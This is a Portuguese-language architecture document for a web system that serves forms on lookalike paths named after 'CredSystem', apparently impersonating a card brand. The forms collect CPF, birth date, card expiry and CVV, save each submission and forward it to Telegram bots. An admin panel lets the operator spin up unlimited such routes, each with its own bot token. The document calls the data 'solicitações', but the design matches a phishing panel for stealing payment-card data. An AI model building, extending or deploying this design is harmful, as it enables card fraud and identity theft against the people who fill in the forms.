# 🏗️ Arquitetura do Sistema

## Visão Geral

```
┌─────────────────────────────────────────────────────────────┐
│                    MESMO DOMÍNIO                            │
│              (exemplo.railway.app)                          │
└─────────────────────────────────────────────────────────────┘
                            │
        ┌───────────────────┼───────────────────┐
        │                   │                   │
        ▼                   ▼                   ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ /credsystem  │    │ /cred-system │    │   /admin     │
│  (Rota 1)    │    │  (Rota 2)    │    │   (Painel)   │
└──────────────┘    └──────────────┘    └──────────────┘
        │                   │                   │
        │                   │                   │
        ▼                   ▼                   ▼
┌─────────────────────────────────────────────────────────────┐
│                    API ROUTES (Next.js)                     │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  /api/submissions  - Criar/Listar solicitações       │  │
│  │  /api/routes       - CRUD de rotas                   │  │
│  │  /api/auth         - Login/Logout/Check              │  │
│  │  /api/validate-route - Validar se rota existe        │  │
│  └──────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│                  PRISMA ORM + PostgreSQL                    │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  RouteConfig    - Configurações das rotas            │  │
│  │  Submission     - Solicitações recebidas             │  │
│  │  AdminUser      - Usuários do admin                  │  │
│  └──────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│                  TELEGRAM API                               │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Bot 1 (Token 1) → Chat ID 1                         │  │
│  │  Bot 2 (Token 2) → Chat ID 2                         │  │
│  └──────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

---

## Fluxo de Dados

### 1. Usuário Acessa Formulário

```
Usuário → /credsystem
          │
          ▼
    [Validação da Rota]
          │
          ▼
    Formulário Renderizado
```

### 2. Usuário Preenche e Envia

```
Formulário → POST /api/submissions
             │
             ├─ routeSlug: "credsystem"
             ├─ cpf: "123.456.789-00"
             ├─ birthDate: "01/01/1990"
             ├─ cardExpiry: "12/25"
             └─ cvv: "123"
```

### 3. Backend Processa

```
API Route
  │
  ├─ 1. Busca RouteConfig (slug: "credsystem")
  │     └─ Obtém: telegramToken, telegramChatId
  │
  ├─ 2. Salva Submission no banco
  │     └─ Vincula à rota (routeSlug)
  │
  ├─ 3. Envia para Telegram
  │     └─ Usa token e chat_id específicos
  │
  └─ 4. Atualiza status (sentToTelegram: true/false)
```

### 4. Mensagem no Telegram

```
Telegram Bot
  │
  └─ Envia mensagem formatada:
      ┌────────────────────────────────┐
      │ Nova Solicitação - CredSystem  │
      │                                │
      │ CPF: 123.456.789-00           │
      │ Data Nasc: 01/01/1990         │
      │ Validade: 12/25               │
      │ CVV: 123                      │
      │                                │
      │ Data/Hora: 16/12/2025 11:30   │
      └────────────────────────────────┘
```

---

## Isolamento de Dados

### Por Rota

```
RouteConfig (slug: "credsystem")
  ├─ telegramToken: "123:ABC..."
  ├─ telegramChatId: "-1001234"
  └─ Submissions:
      ├─ Submission 1 (routeSlug: "credsystem")
      ├─ Submission 2 (routeSlug: "credsystem")
      └─ Submission 3 (routeSlug: "credsystem")

RouteConfig (slug: "cred-system")
  ├─ telegramToken: "456:DEF..."
  ├─ telegramChatId: "-1005678"
  └─ Submissions:
      ├─ Submission 4 (routeSlug: "cred-system")
      └─ Submission 5 (routeSlug: "cred-system")
```

**Resultado**: Dados NUNCA se misturam!

---

## Segurança

### Autenticação Admin

```
Login → POST /api/auth/login
        │
        ├─ Valida username/password
        ├─ Compara hash bcrypt
        │
        └─ Gera JWT Token
            │
            └─ Armazena em Cookie httpOnly
                │
                └─ Todas as requisições admin verificam token
```

### Validação de Rotas

```
Acesso → /credsystem
         │
         └─ GET /api/validate-route/credsystem
             │
             ├─ Verifica se existe no banco
             ├─ Verifica se está ativa
             │
             └─ Se não: 404 "Rota não encontrada"
```

---

## Tecnologias

| Camada | Tecnologia |
|--------|-----------|
| **Frontend** | Next.js 16 + React 19 + TailwindCSS |
| **Backend** | Next.js API Routes |
| **Database** | PostgreSQL (Railway) |
| **ORM** | Prisma |
| **Auth** | JWT (jose) + bcrypt |
| **Deploy** | Railway |
| **Integração** | Telegram Bot API |

---

## Escalabilidade

### Adicionar Nova Rota

1. Acesse `/admin`
2. Clique em "Nova Rota"
3. Configure:
   - Slug (ex: `nova-rota`)
   - Nome
   - Token do bot
   - Chat ID
4. Salve

**Pronto!** A rota `/nova-rota` já está funcionando.

### Sem Limite de Rotas

O sistema suporta **quantas rotas você quiser**, todas isoladas.

---

## Performance

- **Next.js**: Server-side rendering otimizado
- **Prisma**: Queries otimizadas com índices
- **Railway**: Auto-scaling
- **PostgreSQL**: Connection pooling

---

## Monitoramento

### No Painel Admin

- Total de solicitações por rota
- Status de envio (sucesso/falha)
- Filtros por rota
- Reenvio manual se falhar

### No Railway

- Logs em tempo real
- Métricas de CPU/Memória
- Histórico de deploys
- Alertas automáticos
